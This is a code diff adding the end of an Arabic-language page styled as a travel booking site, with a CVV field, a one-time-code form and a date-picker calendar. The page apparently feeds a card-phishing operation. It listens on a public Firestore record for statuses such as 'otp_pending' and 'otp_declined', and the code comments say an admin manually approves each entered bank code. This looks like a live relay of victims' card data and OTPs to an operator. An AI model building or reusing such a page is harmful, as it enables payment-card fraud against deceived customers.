+            document.body.addEventListener('focusout', (e) => { if (e.target.id === 'cvvInput') e.target.type = 'text'; });
+            document.body.addEventListener('keydown', e => {
+                const target = e.target;
+                if (target.closest('.otp-inputs') && e.key === "Backspace" && !target.value) {
+                    const prevInput = target.previousElementSibling;
+                    if (prevInput) { prevInput.focus(); }
+                }
+            });
+            
+        }
+        
+        function listenForBookingStatus(docId) {
+            const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
+            unsubscribeFromPendingBooking = onSnapshot(docRef, async (docSnap) => {
+                
+                if (!docSnap.exists()) {
+                    console.log("Pending document was deleted.");
+                    if (unsubscribeFromPendingBooking) {
+                        unsubscribeFromPendingBooking();
+                        unsubscribeFromPendingBooking = null;
+                    }
+                    const isShowingSuccess = modals.result.classList.contains('active') && modals.result.querySelector('.fa-check-circle');
+                    if (!isShowingSuccess) {
+                         hideModals();
+                         modals.result.innerHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><i class="fas fa-exclamation-circle text-7xl text-[var(--booking-yellow)] mb-4"></i><h3 class="text-2xl font-bold mb-2">انتهت صلاحية الطلب</h3><p class="text-slate-600 mb-6">تم إلغاء هذا الطلب أو تأكيده بالفعل.</p><button class="close-modal-btn w-full bg-slate-200 text-slate-800 font-bold py-3 rounded-lg">حسناً</button></div>`;
+                         showModal('result');
+                    }
+                    return;
+                }
+
+                const data = docSnap.data();
+                console.log("Booking status changed:", data.status);
+
+                const deletePendingDoc = async () => {
+                    try {
+                        if (unsubscribeFromPendingBooking) {
+                            unsubscribeFromPendingBooking();
+                            unsubscribeFromPendingBooking = null;
+                        }
+                        await deleteDoc(docRef);
+                        console.log("Pending document successfully deleted by client.");
+                    } catch (e) {
+                        console.error("Client failed to delete pending doc:", e);
+                    }
+                };
+
+                switch(data.status) {
+                    case 'otp_pending':
+                        hideModals();
+                        showModal('otp');
+                        break;
+                    case 'confirmed':
+                        hideModals();
+                        finalizeBooking(); // This function handles its own deletion
+                        break;
+                    case 'payment_declined':
+                        hideModals();
+                        modals.result.innerHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><i class="fas fa-times-circle text-7xl text-[var(--booking-red)] mb-4"></i><h3 class="text-2xl font-bold mb-2">تم رفض الدفع</h3><p class="text-slate-600 mb-6">لم نتمكن من معالجة الدفع. يرجى التحقق من معلومات بطاقتك والمحاولة مرة أخرى.</p><button data-action="retry-payment" class="w-full bg-slate-200 text-slate-800 font-bold py-3 rounded-lg">حاول مرة أخرى</button></div>`;
+                        showModal('result');
+                        deletePendingDoc();
+                        break;
+                    case 'otp_declined':
+                        hideModals(); // Hide loading modal
+                        
+                        // Re-show OTP modal with an error, allowing the user to try again.
+                        showModal('otp');
+                        const otpForm = document.getElementById('otpForm');
+                        if (otpForm) {
+                            const errorEl = otpForm.querySelector('#otpError');
+                            errorEl.textContent = 'الرمز الذي أدخلته غير صحيح. الرجاء المحاولة مرة أخرى.';
+                            errorEl.classList.remove('hidden');
+                            otpForm.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
+                            otpForm.querySelector('.otp-inputs input').focus();
+                        }
+                        
+                        // Reset the status in Firestore so the admin can approve the next attempt.
+                        await updateDoc(docRef, { status: 'otp_pending', otpCode: '' });
+                        break;
+                }
+            });
+        }
+        
+        function renderCalendar() {
+            const calendarContainer = document.getElementById('calendar-container'); if(!calendarContainer) return;
+            calendarContainer.innerHTML = ''; 
+            let currentDate = new Date(); 
+            currentDate.setDate(1);
+            const today = new Date(); 
+            today.setHours(0, 0, 0, 0);
+
+            const endDate = new Date(2026, 6, 1);
+
+            while (currentDate <= endDate) {
+                const month = currentDate.getMonth(), year = currentDate.getFullYear();
+                let calHTML = `<div class="mb-6"><h4 class="text-xl font-bold text-center mb-3">${monthNames[month]} ${year}</h4><div class="grid grid-cols-7 gap-y-2 text-center text-sm text-slate-500 mb-2">${dayNames.map(d=>`<div>${d.substring(0,2)}</div>`).join('')}</div><div class="grid grid-cols-7 gap-y-1 text-center">`;
+                const firstDay = new Date(year, month, 1).getDay();
+                for (let j = 0; j < (firstDay + 6) % 7; j++) calHTML += `<div></div>`;
+                const daysInMonth = new Date(year, month + 1, 0).getDate();
+                for (let day = 1; day <= daysInMonth; day++) {
+                    const dayDate = new Date(year, month, day);
+                    let classes = 'calendar-day h-10 w-10 flex items-center justify-center rounded-full cursor-pointer mx-auto transition-colors';
+                    if (dayDate < today) {
+                        classes += ' text-slate-300 cursor-not-allowed';
+                    } else {
+                        classes += ' hover:bg-slate-200';
+                        if (activeDateSelection.departure && activeDateSelection.return && dayDate > activeDateSelection.departure && dayDate < activeDateSelection.return) classes += ' day-in-range';
+                        if (activeDateSelection.departure && dayDate.getTime() === activeDateSelection.departure.getTime()) classes += ' day-selected';
+                        if (activeDateSelection.return && dayDate.getTime() === activeDateSelection.return.getTime()) classes += ' day-selected';
+                    }
+                    calHTML += `<div data-date="${dayDate.toISOString()}" class="${classes}">${day}</div>`;
+                }
+                calHTML += `</div></div>`; 
+                calendarContainer.innerHTML += calHTML; 
+                currentDate.setMonth(currentDate.getMonth() + 1);
+            }
+        }
+        
+        initializeAppLogic();
+    });
+</script>
+</body>
+</html>
